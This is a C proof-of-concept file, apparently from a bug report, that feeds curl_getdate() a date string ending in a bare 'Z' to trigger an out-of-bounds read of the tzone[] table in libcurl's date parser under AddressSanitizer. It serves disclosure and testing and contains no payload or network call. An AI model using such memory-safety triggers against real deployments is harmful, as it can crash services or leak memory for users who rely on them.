/* Proof-of-concept for a global-buffer-overflow read in curl's date parser.
 *
 * curl_getdate() is libcurl's public date-parsing entry point (also used
 * internally for parsing HTTP header dates such as Last-Modified or
 * Expires). A date string ending in a bare, single-letter military/NATO
 * time zone designator "Z" (Zulu, i.e. UTC) is valid input accepted by
 * the parser. Reaching it makes checktz() in lib/parsedate.c index the
 * static `tzone[]` table at `tzone['Z' - 'A']`, one element past the end
 * of the array.
 *
 * Build/run under AddressSanitizer against the library; no network
 * access is required.
 */
#include <curl/curl.h>
#include <stdio.h>
#include <time.h>

int main(void)
{
    const char *date = "Sun, 06 Nov 1994 08:49:37 Z";
    time_t t = curl_getdate(date, NULL);

    printf("curl_getdate(\"%s\") = %ld\n", date, (long)t);
    return 0;
}
